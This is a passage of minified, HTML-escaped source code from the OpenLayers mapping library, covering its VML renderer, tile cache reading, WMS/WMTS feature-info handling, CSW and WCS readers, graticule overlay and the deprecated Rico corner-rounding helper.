this.isComplexSymbol(b.graphicName)?(f=this.importSymbol(b.graphicName),a.path=f.path,a.coordorigin=f.left+","+f.bottom,f=f.size,a.coordsize=f+","+f,this.drawCircle(a,d,b.pointRadius),a.style.flip="y"):this.drawCircle(a,d,b.pointRadius);c.isFilled?a.fillcolor=e:a.filled="false";d=a.getElementsByTagName("fill");d=0==d.length?null:d[0];c.isFilled? (d||(d=this.createNode("olv:fill",a.id+"_fill")),d.opacity=b.fillOpacity,"OpenLayers.Geometry.Point"===a._geometryClass&amp;&amp;b.externalGraphic&amp;&amp;(b.graphicOpacity&amp;&amp;(d.opacity=b.graphicOpacity),d.src=b.externalGraphic,d.type="frame",b.graphicWidth&amp;&amp;b.graphicHeight||(d.aspect="atmost")),d.parentNode!=a&amp;&amp;a.appendChild(d)):d&amp;&amp;a.removeChild(d);e=b.rotation;if(void 0!==e||void 0!==a._rotation)a._rotation=e,b.externalGraphic?(this.graphicRotate(a,h,k,b),d.opacity=0):"OpenLayers.Geometry.Point"===a._geometryClass&amp;&amp; (a.style.rotation=e||0);h=a.getElementsByTagName("stroke");h=0==h.length?null:h[0];c.isStroked?(h||(h=this.createNode("olv:stroke",a.id+"_stroke"),a.appendChild(h)),h.on=!0,h.color=b.strokeColor,h.weight=b.strokeWidth+"px",h.opacity=b.strokeOpacity,h.endcap="butt"==b.strokeLinecap?"flat":b.strokeLinecap||"round",b.strokeDashstyle&amp;&amp;(h.dashstyle=this.dashStyle(b))):(a.stroked=!1,h&amp;&amp;(h.on=!1));"inherit"!=b.cursor&amp;&amp;null!=b.cursor&amp;&amp;(a.style.cursor=b.cursor);return a},graphicRotate:function(a,b,c,d){d= d||a._style;var e=d.rotation||0,f,g;if(d.graphicWidth&amp;&amp;d.graphicHeight){g=Math.max(d.graphicWidth,d.graphicHeight);f=d.graphicWidth/d.graphicHeight;var h=Math.round(d.graphicWidth||g*f),k=Math.round(d.graphicHeight||g);a.style.width=h+"px";a.style.height=k+"px";var l=document.getElementById(a.id+"_image");l||(l=this.createNode("olv:imagedata",a.id+"_image"),a.appendChild(l));l.style.width=h+"px";l.style.height=k+"px";l.src=d.externalGraphic;l.style.filter="progid:DXImageTransform.Microsoft.AlphaImageLoader(src='', sizingMethod='scale')"; l=e*Math.PI/180;e=Math.sin(l);l=Math.cos(l);e="progid:DXImageTransform.Microsoft.Matrix(M11="+l+",M12="+-e+",M21="+e+",M22="+l+",SizingMethod='auto expand')\n";(l=d.graphicOpacity||d.fillOpacity)&amp;&amp;1!=l&amp;&amp;(e+="progid:DXImageTransform.Microsoft.BasicImage(opacity="+l+")\n");a.style.filter=e;e=new OpenLayers.Geometry.Point(-b,-c);h=(new OpenLayers.Bounds(0,0,h,k)).toGeometry();h.rotate(d.rotation,e);h=h.getBounds();a.style.left=Math.round(parseInt(a.style.left)+h.left)+"px";a.style.top=Math.round(parseInt(a.style.top)- h.bottom)+"px"}else{var m=new Image;m.onreadystatechange=OpenLayers.Function.bind(function(){if("complete"==m.readyState||"interactive"==m.readyState)f=m.width/m.height,g=Math.max(2*d.pointRadius,d.graphicWidth||0,d.graphicHeight||0),b*=f,d.graphicWidth=g*f,d.graphicHeight=g,this.graphicRotate(a,b,c,d)},this);m.src=d.externalGraphic}},postDraw:function(a){a.style.visibility="visible";var b=a._style.fillColor,c=a._style.strokeColor;"none"==b&amp;&amp;a.fillcolor!=b&amp;&amp;(a.fillcolor=b);"none"==c&amp;&amp;a.strokecolor!= c&amp;&amp;(a.strokecolor=c)},setNodeDimension:function(a,b){var c=b.getBounds();if(c){var d=this.getResolution(),c=new OpenLayers.Bounds((c.left-this.featureDx)/d-this.offset.x|0,c.bottom/d-this.offset.y|0,(c.right-this.featureDx)/d-this.offset.x|0,c.top/d-this.offset.y|0);a.style.left=c.left+"px";a.style.top=c.top+"px";a.style.width=c.getWidth()+"px";a.style.height=c.getHeight()+"px";a.coordorigin=c.left+" "+c.top;a.coordsize=c.getWidth()+" "+c.getHeight()}},dashStyle:function(a){a=a.strokeDashstyle;switch(a){case "solid":case "dot":case "dash":case "dashdot":case "longdash":case "longdashdot":return a; default:return a=a.split(/[ ,]/),2==a.length?1*a[0]>=2*a[1]?"longdash":1==a[0]||1==a[1]?"dot":"dash":4==a.length?1*a[0]>=2*a[1]?"longdashdot":"dashdot":"solid"}},createNode:function(a,b){var c=document.createElement(a);b&amp;&amp;(c.id=b);c.unselectable="on";c.onselectstart=OpenLayers.Function.False;return c},nodeTypeCompare:function(a,b){var c=b,d=c.indexOf(":");-1!=d&amp;&amp;(c=c.substr(d+1));var e=a.nodeName,d=e.indexOf(":");-1!=d&amp;&amp;(e=e.substr(d+1));return c==e},createRenderRoot:function(){return this.nodeFactory(this.container.id+ "_vmlRoot","div")},createRoot:function(a){return this.nodeFactory(this.container.id+a,"olv:group")},drawPoint:function(a,b){return this.drawCircle(a,b,1)},drawCircle:function(a,b,c){if(!isNaN(b.x)&amp;&amp;!isNaN(b.y)){var d=this.getResolution();a.style.left=((b.x-this.featureDx)/d-this.offset.x|0)-c+"px";a.style.top=(b.y/d-this.offset.y|0)-c+"px";b=2*c;a.style.width=b+"px";a.style.height=b+"px";return a}return!1},drawLineString:function(a,b){return this.drawLine(a,b,!1)},drawLinearRing:function(a,b){return this.drawLine(a, b,!0)},drawLine:function(a,b,c){this.setNodeDimension(a,b);for(var d=this.getResolution(),e=b.components.length,f=Array(e),g,h,k=0;k&lt;e;k++)g=b.components[k],h=(g.x-this.featureDx)/d-this.offset.x|0,g=g.y/d-this.offset.y|0,f[k]=" "+h+","+g+" l ";b=c?" x e":" e";a.path="m"+f.join("")+b;return a},drawPolygon:function(a,b){this.setNodeDimension(a,b);var c=this.getResolution(),d=[],e,f,g,h,k,l,m,n,p,q;e=0;for(f=b.components.length;e&lt;f;e++){d.push("m");g=b.components[e].components;h=0===e;l=k=null;m=0; for(n=g.length;m&lt;n;m++)p=g[m],q=(p.x-this.featureDx)/c-this.offset.x|0,p=p.y/c-this.offset.y|0,q=" "+q+","+p,d.push(q),0==m&amp;&amp;d.push(" l"),h||(k?k!=q&amp;&amp;(l?l!=q&amp;&amp;(h=!0):l=q):k=q);d.push(h?" x ":" ")}d.push("e");a.path=d.join("");return a},drawRectangle:function(a,b){var c=this.getResolution();a.style.left=((b.x-this.featureDx)/c-this.offset.x|0)+"px";a.style.top=(b.y/c-this.offset.y|0)+"px";a.style.width=(b.width/c|0)+"px";a.style.height=(b.height/c|0)+"px";return a},drawText:function(a,b,c){var d=this.nodeFactory(a+ this.LABEL_ID_SUFFIX,"olv:rect"),e=this.nodeFactory(a+this.LABEL_ID_SUFFIX+"_textbox","olv:textbox"),f=this.getResolution();d.style.left=((c.x-this.featureDx)/f-this.offset.x|0)+"px";d.style.top=(c.y/f-this.offset.y|0)+"px";d.style.flip="y";e.innerText=b.label;"inherit"!=b.cursor&amp;&amp;null!=b.cursor&amp;&amp;(e.style.cursor=b.cursor);b.fontColor&amp;&amp;(e.style.color=b.fontColor);b.fontOpacity&amp;&amp;(e.style.filter="alpha(opacity="+100*b.fontOpacity+")");b.fontFamily&amp;&amp;(e.style.fontFamily=b.fontFamily);b.fontSize&amp;&amp;(e.style.fontSize= b.fontSize);b.fontWeight&amp;&amp;(e.style.fontWeight=b.fontWeight);b.fontStyle&amp;&amp;(e.style.fontStyle=b.fontStyle);!0===b.labelSelect&amp;&amp;(d._featureId=a,e._featureId=a,e._geometry=c,e._geometryClass=c.CLASS_NAME);e.style.whiteSpace="nowrap";e.inset="1px,0px,0px,0px";d.parentNode||(d.appendChild(e),this.textRoot.appendChild(d));b=b.labelAlign||"cm";1==b.length&amp;&amp;(b+="m");a=e.clientWidth*OpenLayers.Renderer.VML.LABEL_SHIFT[b.substr(0,1)];e=e.clientHeight*OpenLayers.Renderer.VML.LABEL_SHIFT[b.substr(1,1)];d.style.left= parseInt(d.style.left)-a-1+"px";d.style.top=parseInt(d.style.top)+e+"px"},moveRoot:function(a){var b=this.map.getLayer(a.container.id);b instanceof OpenLayers.Layer.Vector.RootContainer&amp;&amp;(b=this.map.getLayer(this.container.id));b&amp;&amp;b.renderer.clear();OpenLayers.Renderer.Elements.prototype.moveRoot.apply(this,arguments);b&amp;&amp;b.redraw()},importSymbol:function(a){var b=this.container.id+"-"+a,c=this.symbolCache[b];if(c)return c;c=OpenLayers.Renderer.symbol[a];if(!c)throw Error(a+" is not a valid symbol name"); a=new OpenLayers.Bounds(Number.MAX_VALUE,Number.MAX_VALUE,0,0);for(var d=["m"],e=0;e&lt;c.length;e+=2){var f=c[e],g=c[e+1];a.left=Math.min(a.left,f);a.bottom=Math.min(a.bottom,g);a.right=Math.max(a.right,f);a.top=Math.max(a.top,g);d.push(f);d.push(g);0==e&amp;&amp;d.push("l")}d.push("x e");c=d.join(" ");d=(a.getWidth()-a.getHeight())/2;0&lt;d?(a.bottom-=d,a.top+=d):(a.left+=d,a.right-=d);c={path:c,size:a.getWidth(),left:a.left,bottom:a.bottom};return this.symbolCache[b]=c},CLASS_NAME:"OpenLayers.Renderer.VML"}); OpenLayers.Renderer.VML.LABEL_SHIFT={l:0,c:0.5,r:1,t:0,m:0.5,b:1};OpenLayers.Control.CacheRead=OpenLayers.Class(OpenLayers.Control,{fetchEvent:"tileloadstart",layers:null,autoActivate:!0,setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);var b,c=this.layers||a.layers;for(b=c.length-1;0&lt;=b;--b)this.addLayer({layer:c[b]});if(!this.layers)a.events.on({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this})},addLayer:function(a){a.layer.events.register(this.fetchEvent,this,this.fetch)},removeLayer:function(a){a.layer.events.unregister(this.fetchEvent, this,this.fetch)},fetch:function(a){if(this.active&amp;&amp;window.localStorage&amp;&amp;a.tile instanceof OpenLayers.Tile.Image){var b=a.tile,c=b.url;!b.layer.crossOriginKeyword&amp;&amp;(OpenLayers.ProxyHost&amp;&amp;0===c.indexOf(OpenLayers.ProxyHost))&amp;&amp;(c=OpenLayers.Control.CacheWrite.urlMap[c]);if(c=window.localStorage.getItem("olCache_"+c))b.url=c,"tileerror"===a.type&amp;&amp;b.setImgSrc(c)}},destroy:function(){if(this.layers||this.map){var a,b=this.layers||this.map.layers;for(a=b.length-1;0&lt;=a;--a)this.removeLayer({layer:b[a]})}this.map&amp;&amp; this.map.events.un({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this});OpenLayers.Control.prototype.destroy.apply(this,arguments)},CLASS_NAME:"OpenLayers.Control.CacheRead"});OpenLayers.Protocol.WFS.v1_0_0=OpenLayers.Class(OpenLayers.Protocol.WFS.v1,{version:"1.0.0",CLASS_NAME:"OpenLayers.Protocol.WFS.v1_0_0"});OpenLayers.Format.WMSGetFeatureInfo=OpenLayers.Class(OpenLayers.Format.XML,{layerIdentifier:"_layer",featureIdentifier:"_feature",regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},gmlFormat:null,read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=a.documentElement;if(b){var c=this["read_"+b.nodeName];a=c?c.call(this,b):(new OpenLayers.Format.GML(this.options?this.options:{})).read(a)}return a},read_msGMLOutput:function(a){var b= [];if(a=this.getSiblingNodesByTagCriteria(a,this.layerIdentifier))for(var c=0,d=a.length;c&lt;d;++c){var e=a[c],f=e.nodeName;e.prefix&amp;&amp;(f=f.split(":")[1]);f=f.replace(this.layerIdentifier,"");if(e=this.getSiblingNodesByTagCriteria(e,this.featureIdentifier))for(var g=0;g&lt;e.length;g++){var h=e[g],k=this.parseGeometry(h),h=this.parseAttributes(h),h=new OpenLayers.Feature.Vector(k.geometry,h,null);h.bounds=k.bounds;h.type=f;b.push(h)}}return b},read_FeatureInfoResponse:function(a){var b=[];a=this.getElementsByTagNameNS(a, "*","FIELDS");for(var c=0,d=a.length;c&lt;d;c++){var e=a[c],f={},g,h=e.attributes.length;if(0&lt;h)for(g=0;g&lt;h;g++){var k=e.attributes[g];f[k.nodeName]=k.nodeValue}else for(e=e.childNodes,g=0,h=e.length;g&lt;h;++g)k=e[g],3!=k.nodeType&amp;&amp;(f[k.getAttribute("name")]=k.getAttribute("value"));b.push(new OpenLayers.Feature.Vector(null,f,null))}return b},getSiblingNodesByTagCriteria:function(a,b){var c=[],d,e,f,g;if(a&amp;&amp;a.hasChildNodes()){d=a.childNodes;f=d.length;for(var h=0;h&lt;f;h++){for(g=d[h];g&amp;&amp;1!=g.nodeType;)g= g.nextSibling,h++;e=g?g.nodeName:"";0&lt;e.length&amp;&amp;-1&lt;e.indexOf(b)?c.push(g):(e=this.getSiblingNodesByTagCriteria(g,b),0&lt;e.length&amp;&amp;(0==c.length?c=e:c.push(e)))}}return c},parseAttributes:function(a){var b={};if(1==a.nodeType){a=a.childNodes;for(var c=a.length,d=0;d&lt;c;++d){var e=a[d];if(1==e.nodeType){var f=e.childNodes,e=e.prefix?e.nodeName.split(":")[1]:e.nodeName;0==f.length?b[e]=null:1==f.length&amp;&amp;(f=f[0],3==f.nodeType||4==f.nodeType)&amp;&amp;(f=f.nodeValue.replace(this.regExes.trimSpace,""),b[e]=f)}}}return b}, parseGeometry:function(a){this.gmlFormat||(this.gmlFormat=new OpenLayers.Format.GML);a=this.gmlFormat.parseFeature(a);var b,c=null;a&amp;&amp;(b=a.geometry&amp;&amp;a.geometry.clone(),c=a.bounds&amp;&amp;a.bounds.clone(),a.destroy());return{geometry:b,bounds:c}},CLASS_NAME:"OpenLayers.Format.WMSGetFeatureInfo"});OpenLayers.Control.WMTSGetFeatureInfo=OpenLayers.Class(OpenLayers.Control,{hover:!1,requestEncoding:"KVP",drillDown:!1,maxFeatures:10,clickCallback:"click",layers:null,queryVisible:!0,infoFormat:"text/html",vendorParams:{},format:null,formatOptions:null,handler:null,hoverRequest:null,pending:0,initialize:function(a){a=a||{};a.handlerOptions=a.handlerOptions||{};OpenLayers.Control.prototype.initialize.apply(this,[a]);this.format||(this.format=new OpenLayers.Format.WMSGetFeatureInfo(a.formatOptions)); !0===this.drillDown&amp;&amp;(this.hover=!1);this.hover?this.handler=new OpenLayers.Handler.Hover(this,{move:this.cancelHover,pause:this.getInfoForHover},OpenLayers.Util.extend(this.handlerOptions.hover||{},{delay:250})):(a={},a[this.clickCallback]=this.getInfoForClick,this.handler=new OpenLayers.Handler.Click(this,a,this.handlerOptions.click||{}))},getInfoForClick:function(a){this.request(a.xy,{})},getInfoForHover:function(a){this.request(a.xy,{hover:!0})},cancelHover:function(){this.hoverRequest&amp;&amp;(--this.pending, 0>=this.pending&amp;&amp;(OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait"),this.pending=0),this.hoverRequest.abort(),this.hoverRequest=null)},findLayers:function(){for(var a=this.layers||this.map.layers,b=[],c,d=a.length-1;0&lt;=d&amp;&amp;(c=a[d],!(c instanceof OpenLayers.Layer.WMTS)||(c.requestEncoding!==this.requestEncoding||this.queryVisible&amp;&amp;!c.getVisibility())||(b.push(c),this.drillDown&amp;&amp;!this.hover));--d);return b},buildRequestOptions:function(a,b){var c=this.map.getLonLatFromPixel(b),d=a.getURL(new OpenLayers.Bounds(c.lon, c.lat,c.lon,c.lat)),d=OpenLayers.Util.getParameters(d),c=a.getTileInfo(c);OpenLayers.Util.extend(d,{service:"WMTS",version:a.version,request:"GetFeatureInfo",infoFormat:this.infoFormat,i:c.i,j:c.j});OpenLayers.Util.applyDefaults(d,this.vendorParams);return{url:OpenLayers.Util.isArray(a.url)?a.url[0]:a.url,params:OpenLayers.Util.upperCaseObject(d),callback:function(c){this.handleResponse(b,c,a)},scope:this}},request:function(a,b){b=b||{};var c=this.findLayers();if(0&lt;c.length){for(var d,e,f=0,g=c.length;f&lt; g;f++)e=c[f],d=this.events.triggerEvent("beforegetfeatureinfo",{xy:a,layer:e}),!1!==d&amp;&amp;(++this.pending,d=this.buildRequestOptions(e,a),d=OpenLayers.Request.GET(d),!0===b.hover&amp;&amp;(this.hoverRequest=d));0&lt;this.pending&amp;&amp;OpenLayers.Element.addClass(this.map.viewPortDiv,"olCursorWait")}},handleResponse:function(a,b,c){--this.pending;0>=this.pending&amp;&amp;(OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait"),this.pending=0);if(b.status&amp;&amp;(200>b.status||300&lt;=b.status))this.events.triggerEvent("exception", {xy:a,request:b,layer:c});else{var d=b.responseXML;d&amp;&amp;d.documentElement||(d=b.responseText);var e,f;try{e=this.format.read(d)}catch(g){f=!0,this.events.triggerEvent("exception",{xy:a,request:b,error:g,layer:c})}f||this.events.triggerEvent("getfeatureinfo",{text:b.responseText,features:e,request:b,xy:a,layer:c})}},CLASS_NAME:"OpenLayers.Control.WMTSGetFeatureInfo"});OpenLayers.Protocol.CSW.v2_0_2=OpenLayers.Class(OpenLayers.Protocol,{formatOptions:null,initialize:function(a){OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=new OpenLayers.Format.CSWGetRecords.v2_0_2(OpenLayers.Util.extend({},this.formatOptions)))},destroy:function(){this.options&amp;&amp;!this.options.format&amp;&amp;this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){a=OpenLayers.Util.extend({},a);OpenLayers.Util.applyDefaults(a, this.options||{});var b=new OpenLayers.Protocol.Response({requestType:"read"}),c=this.format.write(a.params||a);b.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,b,a),params:a.params,headers:a.headers,data:c});return b},handleRead:function(a,b){if(b.callback){var c=a.priv;200&lt;=c.status&amp;&amp;300>c.status?(a.data=this.parseData(c),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE;b.callback.call(b.scope,a)}},parseData:function(a){var b= a.responseXML;b&amp;&amp;b.documentElement||(b=a.responseText);return!b||0>=b.length?null:this.format.read(b)},CLASS_NAME:"OpenLayers.Protocol.CSW.v2_0_2"});OpenLayers.Format.WCSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WCSCapabilities.v1,{namespaces:{wcs:"http://www.opengis.net/wcs/1.1",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",ows:"http://www.opengis.net/ows/1.1"},errorProperty:"operationsMetadata",readers:{wcs:OpenLayers.Util.applyDefaults({Capabilities:function(a,b){this.readChildNodes(a,b)},Contents:function(a,b){b.contentMetadata=[];this.readChildNodes(a,b.contentMetadata)},CoverageSummary:function(a, b){var c={};this.readChildNodes(a,c);b.push(c)},Identifier:function(a,b){b.identifier=this.getChildValue(a)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b["abstract"]=this.getChildValue(a)},SupportedCRS:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b.supportedCRS||(b.supportedCRS=[]),b.supportedCRS.push(c))},SupportedFormat:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b.supportedFormat||(b.supportedFormat=[]),b.supportedFormat.push(c))}},OpenLayers.Format.WCSCapabilities.v1.prototype.readers.wcs), ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WCSCapabilities.v1_1_0"});OpenLayers.Control.Graticule=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,intervals:[45,30,20,10,5,2,1,0.5,0.2,0.1,0.05,0.01,0.005,0.002,0.001],displayInLayerSwitcher:!0,visible:!0,numPoints:50,targetSize:200,layerName:null,labelled:!0,labelFormat:"dm",lineSymbolizer:{strokeColor:"#333",strokeWidth:1,strokeOpacity:0.5},labelSymbolizer:{},gratLayer:null,initialize:function(a){a=a||{};a.layerName=a.layerName||OpenLayers.i18n("Graticule");OpenLayers.Control.prototype.initialize.apply(this,[a]); this.labelSymbolizer.stroke=!1;this.labelSymbolizer.fill=!1;this.labelSymbolizer.label="${label}";this.labelSymbolizer.labelAlign="${labelAlign}";this.labelSymbolizer.labelXOffset="${xOffset}";this.labelSymbolizer.labelYOffset="${yOffset}"},destroy:function(){this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments);this.gratLayer&amp;&amp;(this.gratLayer.destroy(),this.gratLayer=null)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);if(!this.gratLayer){var a=new OpenLayers.Style({}, {rules:[new OpenLayers.Rule({symbolizer:{Point:this.labelSymbolizer,Line:this.lineSymbolizer}})]});this.gratLayer=new OpenLayers.Layer.Vector(this.layerName,{styleMap:new OpenLayers.StyleMap({"default":a}),visibility:this.visible,displayInLayerSwitcher:this.displayInLayerSwitcher})}return this.div},activate:function(){return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.map.addLayer(this.gratLayer),this.map.events.register("moveend",this,this.update),this.update(),!0):!1},deactivate:function(){return OpenLayers.Control.prototype.deactivate.apply(this, arguments)?(this.map.events.unregister("moveend",this,this.update),this.map.removeLayer(this.gratLayer),!0):!1},update:function(){var a=this.map.getExtent();if(a){this.gratLayer.destroyFeatures();var b=new OpenLayers.Projection("EPSG:4326"),c=this.map.getProjectionObject(),d=this.map.getResolution();c.proj&amp;&amp;"longlat"==c.proj.projName&amp;&amp;(this.numPoints=1);var e=this.map.getCenter(),f=new OpenLayers.Pixel(e.lon,e.lat);OpenLayers.Projection.transform(f,c,b);for(var e=this.targetSize*d,e=e*e,g,d=0;d&lt;this.intervals.length;++d){g= this.intervals[d];var h=g/2,k=f.offset({x:-h,y:-h}),h=f.offset({x:h,y:h});OpenLayers.Projection.transform(k,b,c);OpenLayers.Projection.transform(h,b,c);if((k.x-h.x)*(k.x-h.x)+(k.y-h.y)*(k.y-h.y)&lt;=e)break}f.x=Math.floor(f.x/g)*g;f.y=Math.floor(f.y/g)*g;var d=0,e=[f.clone()],h=f.clone(),l;do h=h.offset({x:0,y:g}),l=OpenLayers.Projection.transform(h.clone(),b,c),e.unshift(h);while(a.containsPixel(l)&amp;&amp;1E3>++d);h=f.clone();do h=h.offset({x:0,y:-g}),l=OpenLayers.Projection.transform(h.clone(),b,c),e.push(h); while(a.containsPixel(l)&amp;&amp;1E3>++d);d=0;k=[f.clone()];h=f.clone();do h=h.offset({x:-g,y:0}),l=OpenLayers.Projection.transform(h.clone(),b,c),k.unshift(h);while(a.containsPixel(l)&amp;&amp;1E3>++d);h=f.clone();do h=h.offset({x:g,y:0}),l=OpenLayers.Projection.transform(h.clone(),b,c),k.push(h);while(a.containsPixel(l)&amp;&amp;1E3>++d);g=[];for(d=0;d&lt;k.length;++d){l=k[d].x;for(var f=[],m=null,n=Math.min(e[0].y,90),h=Math.max(e[e.length-1].y,-90),p=(n-h)/this.numPoints,n=h,h=0;h&lt;=this.numPoints;++h){var q=new OpenLayers.Geometry.Point(l, n);q.transform(b,c);f.push(q);n+=p;q.y>=a.bottom&amp;&amp;!m&amp;&amp;(m=q)}this.labelled&amp;&amp;(m=new OpenLayers.Geometry.Point(m.x,a.bottom),l={value:l,label:this.labelled?OpenLayers.Util.getFormattedLonLat(l,"lon",this.labelFormat):"",labelAlign:"cb",xOffset:0,yOffset:2},this.gratLayer.addFeatures(new OpenLayers.Feature.Vector(m,l)));f=new OpenLayers.Geometry.LineString(f);g.push(new OpenLayers.Feature.Vector(f))}for(h=0;h&lt;e.length;++h)if(n=e[h].y,!(-90>n||90&lt;n)){f=[];d=k[0].x;p=(k[k.length-1].x-d)/this.numPoints; l=d;m=null;for(d=0;d&lt;=this.numPoints;++d)q=new OpenLayers.Geometry.Point(l,n),q.transform(b,c),f.push(q),l+=p,q.x&lt;a.right&amp;&amp;(m=q);this.labelled&amp;&amp;(m=new OpenLayers.Geometry.Point(a.right,m.y),l={value:n,label:this.labelled?OpenLayers.Util.getFormattedLonLat(n,"lat",this.labelFormat):"",labelAlign:"rb",xOffset:-2,yOffset:2},this.gratLayer.addFeatures(new OpenLayers.Feature.Vector(m,l)));f=new OpenLayers.Geometry.LineString(f);g.push(new OpenLayers.Feature.Vector(f))}this.gratLayer.addFeatures(g)}},CLASS_NAME:"OpenLayers.Control.Graticule"});OpenLayers.Console.warn("OpenLayers.Rico is deprecated");OpenLayers.Rico=OpenLayers.Rico||{}; OpenLayers.Rico.Corner={round:function(a,b){a=OpenLayers.Util.getElement(a);this._setOptions(b);var c=this.options.color;"fromElement"==this.options.color&amp;&amp;(c=this._background(a));var d=this.options.bgColor;"fromParent"==this.options.bgColor&amp;&amp;(d=this._background(a.offsetParent));this._roundCornersImpl(a,c,d)},changeColor:function(a,b){a.style.backgroundColor=b;for(var c=a.parentNode.getElementsByTagName("span"),d=0;d&lt;c.length;d++)c[d].style.backgroundColor=b},changeOpacity:function(a,b){var c="alpha(opacity="+ 100*b+")";a.style.opacity=b;a.style.filter=c;for(var d=a.parentNode.getElementsByTagName("span"),e=0;e&lt;d.length;e++)d[e].style.opacity=b,d[e].style.filter=c},reRound:function(a,b){var c=a.parentNode.childNodes[2];a.parentNode.removeChild(a.parentNode.childNodes[0]);a.parentNode.removeChild(c);this.round(a.parentNode,b)},_roundCornersImpl:function(a,b,c){this.options.border&amp;&amp;this._renderBorder(a,c);this._isTopRounded()&amp;&amp;this._roundTopCorners(a,b,c);this._isBottomRounded()&amp;&amp;this._roundBottomCorners(a, b,c)},_renderBorder:function(a,b){var c="1px solid "+this._borderColor(b);a.innerHTML="&lt;div "+("style='border-left: "+c+";"+("border-right: "+c)+"'")+">"+a.innerHTML+"&lt;/div>"},_roundTopCorners:function(a,b,c){for(var d=this._createCorner(c),e=0;e&lt;this.options.numSlices;e++)d.appendChild(this._createCornerSlice(b,c,e,"top"));a.style.paddingTop=0;a.insertBefore(d,a.firstChild)},_roundBottomCorners:function(a,b,c){for(var d=this._createCorner(c),e=this.options.numSlices-1;0&lt;=e;e--)d.appendChild(this._createCornerSlice(b, c,e,"bottom"));a.style.paddingBottom=0;a.appendChild(d)},_createCorner:function(a){var b=document.createElement("div");b.style.backgroundColor=this._isTransparent()?"transparent":a;return b},_createCornerSlice:function(a,b,c,d){var e=document.createElement("span"),f=e.style;f.backgroundColor=a;f.display="block";f.height="1px";f.overflow="hidden";f.fontSize="1px";a=this._borderColor(a,b);this.options.border&amp;&amp;0==c?(f.borderTopStyle="solid",f.borderTopWidth="1px",f.borderLeftWidth="0px",f.borderRightWidth= "0px",f.borderBottomWidth="0px",f.height="0px",f.borderColor=a):a&amp;&amp;(f.borderColor=a,f.borderStyle="solid",f.borderWidth="0px 1px");this.options.compact||c!=this.options.numSlices-1||(f.height="2px");this._setMargin(e,c,d);this._setBorder(e,c,d);return e},_setOptions:function(a){this.options={corners:"all",color:"fromElement",bgColor:"fromParent",blend:!0,border:!1,compact:!1};OpenLayers.Util.extend(this.options,a||{});this.options.numSlices=this.options.compact?2:4;this._isTransparent()&amp;&amp;(this.options.blend= !1)},_whichSideTop:function(){return this._hasString(this.options.corners,"all","top")||0&lt;=this.options.corners.indexOf("tl")&amp;&amp;0&lt;=this.options.corners.indexOf("tr")?"":0&lt;=this.options.corners.indexOf("tl")?"left":0&lt;=this.options.corners.indexOf("tr")?"right":""},_whichSideBottom:function(){return this._hasString(this.options.corners,"all","bottom")||0&lt;=this.options.corners.indexOf("bl")&amp;&amp;0&lt;=this.options.corners.indexOf("br")?"":0&lt;=this.options.corners.indexOf("bl")?"left":0&lt;=this.options.corners.indexOf("br")? "right":""},_borderColor:function(a,b){return"transparent"==a?b:this.options.border?this.options.border:this.options.blend?this._blend(b,a):""},_setMargin:function(a,b,c){b=this._marginSize(b);c="top"==c?this._whichSideTop():this._whichSideBottom();"left"==c?(a.style.marginLeft=b+"px",a.style.marginRight="0px"):"right"==c?(a.style.marginRight=b+"px",a.style.marginLeft="0px"):(a.style.marginLeft=b+"px",a.style.marginRight=b+"px")},_setBorder:function(a,b,c){b=this._borderSize(b);c="top"==c?this._whichSideTop(): this._whichSideBottom();"left"==c?(a.style.borderLeftWidth=b+"px",a.style.borderRightWidth="0px"):"right"==c?(a.style.borderRightWidth=b+"px",a.style.borderLeftWidth="0px"):(a.style.borderLeftWidth=b+"px",a.style.borderRightWidth=b+"px");!1!=this.options.border&amp;&amp;(a.style.borderLeftWidth=b+"px",a.style.borderRightWidth=b+"px")},_marginSize:function(a){if(this._isTransparent())return 0;var b=[5,3,2,1],c=[3,2,1,0],d=[2,1],e=[1,0];return this.options.compact&amp;&amp;this.options.blend?e[a]:this.options.compact? d[a]:this.options.blend?c[a]:b[a]},_borderSize:function(a){var b=[5,3,2,1],c=[2,1,1,1],d=[1,0],e=[0,2,0,0];return this.options.compact&amp;&amp;(this.options.blend||this._isTransparent())?1:this.options.compact?d[a]:this.options.blend?c[a]:this.options.border?e[a]:this._isTransparent()?b[a]:0},_hasString:function(a){for(var b=1;b&lt;arguments.length;b++)if(0&lt;=a.indexOf(arguments[b]))return!0;return!1},_blend:function(a,b){var c=OpenLayers.Rico.Color.createFromHex(a);c.blend(OpenLayers.Rico.Color.createFromHex(b)); return c},_background:function(a){try{return OpenLayers.Rico.Color.createColorFromBackground(a).asHex()}catch(b){return"#ffffff"}},_isTransparent:function(){return"transparent"==this.options.color},_isTopRounded:function(){return this._hasString(this.options.corners,"all","top","tl","tr")},_isBottomRounded:function(){return this._hasString(this.options.corners,"all","bottom","bl","br")},_hasSingleTextChild:function(a){return 